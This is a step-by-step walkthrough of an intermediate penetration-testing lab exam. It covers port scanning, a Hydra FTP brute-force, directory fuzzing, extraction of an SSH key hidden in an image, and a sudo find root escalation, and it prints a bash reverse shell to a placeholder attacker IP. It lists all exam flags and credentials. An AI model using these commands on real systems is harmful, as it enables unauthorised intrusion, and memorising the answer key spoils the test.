# Apex Cyber Defense - Network Pentesting Exam: Complete Walkthrough
**Exam Level:** Intermediate / Practical Penetration Testing  
**Target:** Provided Host IP (`<TARGET_IP>`)  
**Objective:** Recover all 3 Proof Flags and obtain Root Privileges  

---

## 1. Executive Summary & Attack Chain

```mermaid
flowchart TD
    A["Nmap Scan on <TARGET_IP>"] --> B["Discovered 3 Ports: 80 (HTTP), 21 (FTP), 2222 (SSH)"]
    
    subgraph Phase1 ["Phase 1: Web Reconnaissance"]
        B --> C["Port 80: Browse Corporate Portal"]
        C --> D["Identify Username: alicesmith"]
        C --> E["Inspect HTML Source: Flag 1"]
        C --> F["Check /login.html: Web Login Blocked -> Points to FTP Gateway"]
    end
    
    subgraph Phase2 ["Phase 2: Password Profiling & FTP"]
        D --> G["cewl http://<TARGET_IP>/ -m 6 -w passwords.txt"]
        G --> H["hydra -l alicesmith -P passwords.txt ftp://<TARGET_IP>"]
        H --> I["FTP Cracked: alicesmith : CyberVanguard"]
        I --> J["Download ssh_instructions.txt<br/>(Notice: SSH on port 2222; Key hidden in Web Directory)"]
    end
    
    subgraph Phase3 ["Phase 3: Directory Fuzzing & Stego Key Extraction"]
        J --> K["gobuster / dirsearch on Web Server"]
        K --> L["Discover Hidden Directory: /backup/"]
        L --> M["Download Image: /backup/security_backup.png"]
        M --> N["Extract & Decode Base64 OpenSSH Key<br/>strings security_backup.png | base64 -d > id_rsa"]
    end
    
    subgraph Phase4 ["Phase 4: SSH Foothold"]
        N --> O["chmod 600 id_rsa"]
        O --> P["ssh -i id_rsa -p 2222 alicesmith@<TARGET_IP>"]
        P --> Q["User Shell: Flag 2 in user.txt"]
        P --> R["Read PrivEsc Clue: clue.txt"]
    end
    
    subgraph Phase5 ["Phase 5: GTFOBins Root Privilege Escalation"]
        R --> S["sudo -l -> (root) NOPASSWD: /usr/bin/find"]
        S --> T["GTFOBins Exploit: Direct Root or Reverse Shell<br/>nc -lvnp 4444 <--> sudo find . -exec bash reverse shell"]
        T --> U["Root Shell: Capture Final Flag 3 in /root/root.txt"]
    end
```

---

## 2. Master Flag & Credential Reference

| Stage | Target / Artifact | Value | Location / Method | Points |
|---|---|---|---|---|
| **Phase 1** | Target Username | `alicesmith` | Web Portal (`/about.html`) | 10 pts |
| **Phase 1** | **Flag 1** (Web Recon) | `FLAG{w3b_r3c0n_us3rn4m3_f0und_9482}` | Page source of `http://<TARGET_IP>/about.html` | 15 pts |
| **Phase 2** | Target Password | `CyberVanguard` | CeWL wordlist brute-forced via Hydra on FTP | 15 pts |
| **Phase 2** | FTP Instruction Clue | `ssh_instructions.txt` | FTP root (`/home/alicesmith/ssh_instructions.txt`) | 10 pts |
| **Phase 3** | Hidden Web Directory | `/backup/` | Gobuster / Dirsearch discovery | 10 pts |
| **Phase 3** | Decoded SSH Key | `id_rsa` (2048-bit RSA) | Base64-decoded from `security_backup.png` | 15 pts |
| **Phase 4** | **Flag 2** (User Shell) | `FLAG{ssh_k3y_auth_p0rt_2222_pwn3d_1834}` | `/home/alicesmith/user.txt` (SSH Port 2222) | 10 pts |
| **Phase 5** | PrivEsc Misconfiguration | `(ALL) NOPASSWD: /usr/bin/find` | Listed via `sudo -l` | 5 pts |
| **Phase 5** | **Flag 3** (Root Shell) | `FLAG{4p3x_d3f3ns3_pwn3d_5521}` | `/root/root.txt` via GTFOBins root exploit | 10 pts |
| **Total** | | | | **100 pts** |

---

## 3. Step-by-Step Technical Walkthrough

### Phase 1: Port Scanning & Initial Enumeration

#### Step 1.1: Full TCP Port Scan
Run a full TCP port scan from your attacking machine (Kali Linux / Parrot OS):

```bash
nmap -p- --min-rate 1000 -sV -sC -oN full_scan.txt <TARGET_IP>
```

**Scan Results:**
```text
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.x
| ftp-syst: 
|   STAT: 
|   FTP server status:
|_  215 UNIX Type: L8
80/tcp   open  http    nginx
|_http-title: Apex Cyber Defense | Autonomous Infrastructure Protection
2222/tcp open  ssh     OpenSSH 9.x (protocol 2.0)
| ssh-hostkey: 
|_  2048 4d:ky:e9:... (RSA)
```

> **Key Takeaway:** Exactly 3 ports are open:
> - Port `80`: Corporate HTTP web server
> - Port `21`: vsftpd FTP service
> - Port `2222`: OpenSSH running on a non-standard port (**standard port 22 is closed/filtered**).

---

#### Step 1.2: Web Application Reconnaissance (Port 80)
1. Open your browser and navigate to `http://<TARGET_IP>/`.
2. Explore the site pages:
   - **Home (`/index.html`):** Marketing material describing the proprietary security framework *CyberVanguard*.
   - **About & Team (`/about.html`):** Lists company staff and systems leadership:
     - Lead Systems & Infrastructure Engineer: **Alice Smith**
     - Target System Username: **`alicesmith`**
3. View the HTML page source of `/about.html` (`Ctrl + U` or right-click -> *View Page Source*):
   ```html
   <!-- STAGE 1 RECON FLAG: FLAG{w3b_r3c0n_us3rn4m3_f0und_9482} -->
   ```
   **Captured Flag 1:** `FLAG{w3b_r3c0n_us3rn4m3_f0und_9482}`

4. Check the Client Portal at `http://<TARGET_IP>/login.html`:
   - Submitting the form displays a prominent red security warning:
     > **ACCESS RESTRICTED (#SEC-4029):** Direct web authentication is disabled by security policy. Authorized staff (`alicesmith`) must authenticate via the **Secure FTP Gateway (Port 21)**.

---

### Phase 2: Password Profiling (CeWL) & FTP Gateway Access

#### Step 2.1: Scrape Custom Wordlist using `cewl`
Because generic wordlists (like `rockyou.txt`) are prohibited or too slow, scrape keywords directly from the target website:

```bash
cewl http://<TARGET_IP>/ -m 6 -w passwords.txt
```

Verify that targeted keywords were extracted:
```bash
grep -i "vanguard" passwords.txt
# Output: CyberVanguard
```

---

#### Step 2.2: Brute-Force FTP Credentials using `hydra`
Attack the FTP service on port 21 with username `alicesmith` and the generated `passwords.txt`:

```bash
hydra -l alicesmith -P passwords.txt ftp://<TARGET_IP> -t 4
```

**Hydra Output:**
```text
[21][ftp] host: <TARGET_IP>   login: alicesmith   password: CyberVanguard
1 of 1 target successfully completed, 1 valid password found
```

---

#### Step 2.3: Connect to FTP & Read Instructions
Connect to the FTP server using the cracked credentials:

```bash
ftp <TARGET_IP>
```
```text
Connected to <TARGET_IP>.
220 Apex Cyber Defense Secure FTP Gateway v2.4 Ready.
Name (<TARGET_IP>:user): alicesmith
331 Please specify the password.
Password: CyberVanguard
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

List the contents of the FTP root:
```text
ftp> ls -la
-rw-r--r-- 1 alicesmith alicesmith  892 Nov 24 12:00 ssh_instructions.txt
```
*(Notice: The private key `id_rsa` is NOT in FTP! Only `ssh_instructions.txt` is present).*

Download the instruction file:
```text
ftp> get ssh_instructions.txt
226 Transfer complete.
ftp> bye
```

Inspect the downloaded instructions:
```bash
cat ssh_instructions.txt
```
```text
========================================================================
APEX CYBER DEFENSE - IT INFRASTRUCTURE NOTIFICATION
========================================================================
To: alicesmith@apexdefense.local
Subject: OpenSSH Relocation & Key Vault Hardening

Hi Alice,

In compliance with corporate security directive #SEC-9912:
1. Standard SSH port 22 has been disabled. OpenSSH is running on
   custom port: 2222.

2. Plaintext SSH keys are strictly PROHIBITED from being stored on this
   FTP server. Your emergency key backup has been placed inside an
   unlinked hidden directory on our corporate web server (Port 80).

3. To locate and recover your private key:
   - Use web directory enumeration tools (e.g., gobuster or dirsearch)
     against the web portal (http://<TARGET_IP>/).
   - Locate the backup directory and download: security_backup.png
   - Decode the base64 OpenSSH key embedded inside the image metadata:
       exiftool -Comment security_backup.png | base64 -d > id_rsa
       - OR -
       strings security_backup.png | grep -E '^[A-Za-z0-9+/=]{100,}' | base64 -d > id_rsa

4. Enforce strict permissions: chmod 600 id_rsa
5. Connect to the custom port: ssh -i id_rsa -p 2222 alicesmith@<TARGET_IP>

- DevOps Security Operations
========================================================================
```

---

### Phase 3: Web Directory Fuzzing (Gobuster/Dirsearch) & Stego Key Extraction

#### Step 3.1: Enumerate Web Directories
Using the clue from FTP, fuzz the web server on Port 80 to discover the hidden backup directory.

**Option A — Using Gobuster:**
```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt
```
**Output:**
```text
===============================================================
Gobuster v3.6
===============================================================
/about.html           (Status: 200) [Size: 3120]
/backup               (Status: 301) [Size: 169] [--> /backup/]
/login.html           (Status: 200) [Size: 2840]
/style.css            (Status: 200) [Size: 4520]
===============================================================
```

**Option B — Using Dirsearch:**
```bash
dirsearch -u http://<TARGET_IP>/
```
**Output:**
```text
[12:00:00] 301 -  169B  - /backup  ->  /backup/
[12:00:00] 200 -  850B  - /backup/
```

---

#### Step 3.2: Download the Recovery Image
Navigate to `http://<TARGET_IP>/backup/` in your browser, or download directly via `wget`:

```bash
wget http://<TARGET_IP>/backup/security_backup.png
```

Verify the downloaded file:
```bash
file security_backup.png
# Output: security_backup.png: PNG image data, 32 x 32, 8-bit/color RGB, non-interlaced
```

---

#### Step 3.3: Decode the Embedded OpenSSH Private Key
The OpenSSH private key was base64-encoded and embedded in the image's comment/metadata chunk.

**Method 1 — Using `strings` and `base64` (Standard on all Linux systems):**
```bash
strings security_backup.png | grep -E '^[A-Za-z0-9+/=]{100,}' | base64 -d > id_rsa
```

**Method 2 — Using `exiftool`:**
```bash
exiftool -Comment security_backup.png | base64 -d > id_rsa
```

**Method 3 — Using Python:**
```bash
python3 -c "import base64, re; print(base64.b64decode(re.search(r'[A-Za-z0-9+/=]{100,}', open('security_backup.png','rb').read().decode('latin1')).group()).decode())" > id_rsa
```

**Verify the Extracted Key:**
```bash
head -n 2 id_rsa
```
**Output:**
```text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
```

---

### Phase 4: SSH Key-Based Foothold (Port 2222)

#### Step 4.1: Enforce Strict File Permissions
OpenSSH rejects keys with loose permissions:

```bash
chmod 600 id_rsa
```

#### Step 4.2: Connect to OpenSSH on Port 2222
Connect specifying the private key (`-i id_rsa`) and custom port (`-p 2222`):

```bash
ssh -i id_rsa -p 2222 alicesmith@<TARGET_IP>
```

**Banner & Login:**
```text
============================================================
 Apex Cyber Defense Appliance v3.11 (Restricted Port 2222)
 Authorized authentication: alicesmith (Key-based active)
============================================================
Last login: Mon Nov 24 10:15:22 2026 from internal-vpn

alicesmith@apex-defense-target:~$ 
```

---

#### Step 4.3: Capture Flag 2 (User Flag)
```bash
cat user.txt
```
**Output:**
```text
FLAG{ssh_k3y_auth_p0rt_2222_pwn3d_1834}
```

#### Step 4.4: Inspect Privilege Escalation Clue
```bash
cat clue.txt
```
```text
========================================================================
STAGE 3 COMPLETE - PRIVILEGE ESCALATION NOTICE
========================================================================
Flag 2: FLAG{ssh_k3y_auth_p0rt_2222_pwn3d_1834}

CLUE FOR NEXT STAGE:
The target system has a misconfigured administrative utility.
1. Check what commands your user is permitted to run as root: sudo -l
2. Check GTFOBins (https://gtfobins.github.io/) to exploit this binary.
3. Catch a root reverse shell (nc -lvnp 4444) or spawn root.
4. Capture the final root flag located at: /root/root.txt
========================================================================
```

---

### Phase 5: GTFOBins Privilege Escalation to Root

#### Step 5.1: Check Sudo Permissions
Run `sudo -l` to check what binaries Alice can run as root without a password:

```bash
sudo -l
```
**Output:**
```text
Matching Defaults entries for alicesmith on apex-defense-target:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin

User alicesmith may run the following commands on apex-defense-target:
    (ALL) NOPASSWD: /usr/bin/find
```

---

#### Step 5.2: Exploit `/usr/bin/find` via GTFOBins

According to [GTFOBins (`find`)](https://gtfobins.github.io/gtfobins/find/):  
The `find` utility supports the `-exec` flag, which executes commands with root privileges when run under `sudo`.

##### Option A: Direct Root Shell Spawn
Execute:
```bash
sudo /usr/bin/find . -exec /bin/bash \; -quit
```

Verify root context:
```text
root@apex-defense-target:/home/alicesmith# id
uid=0(root) gid=0(root) groups=0(root)
```

##### Option B: Root Reverse Shell (via Netcat)
1. On your **attacker machine** (Kali Linux), start a netcat listener:
   ```bash
   nc -lvnp 4444
   ```
2. In the target **SSH session**, trigger the reverse shell:
   ```bash
   sudo /usr/bin/find . -exec /bin/bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1" \; -quit
   ```
3. Your netcat listener catches the root shell:
   ```text
   connect to [<ATTACKER_IP>] from (UNKNOWN) [<TARGET_IP>] 52891
   root@apex-defense-target:/home/alicesmith# id
   uid=0(root) gid=0(root) groups=0(root)
   ```

---

#### Step 5.3: Capture Final Flag 3 (Root Flag)
Navigate to `/root` and read the final flag:

```bash
cat /root/root.txt
```
**Output:**
```text
FLAG{4p3x_d3f3ns3_pwn3d_5521}
```

🏆 **Target completely compromised! All 3 flags recovered (100/100 points).**

---

## 4. Rapid Command Cheat Sheet (Summary)

```bash
# 1. Full Port Scan
nmap -p- --min-rate 1000 -sV <TARGET_IP>

# 2. Web Recon -> Find Username & Flag 1
curl -s http://<TARGET_IP>/about.html | grep -i "FLAG{"

# 3. CeWL Wordlist & Hydra FTP Brute-Force
cewl http://<TARGET_IP>/ -m 6 -w passwords.txt
hydra -l alicesmith -P passwords.txt ftp://<TARGET_IP>

# 4. FTP -> Download Instructions
ftp <TARGET_IP> (User: alicesmith | Pass: CyberVanguard)
ftp> get ssh_instructions.txt

# 5. Web Directory Fuzzing -> Locate /backup/
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt
wget http://<TARGET_IP>/backup/security_backup.png

# 6. Extract id_rsa from Image
strings security_backup.png | grep -E '^[A-Za-z0-9+/=]{100,}' | base64 -d > id_rsa

# 7. Connect via SSH on Port 2222 -> Capture Flag 2
chmod 600 id_rsa
ssh -i id_rsa -p 2222 alicesmith@<TARGET_IP>
cat user.txt

# 8. Check Sudo Privileges & GTFOBins Root PrivEsc -> Capture Flag 3
sudo -l
sudo /usr/bin/find . -exec /bin/bash \; -quit
cat /root/root.txt
```
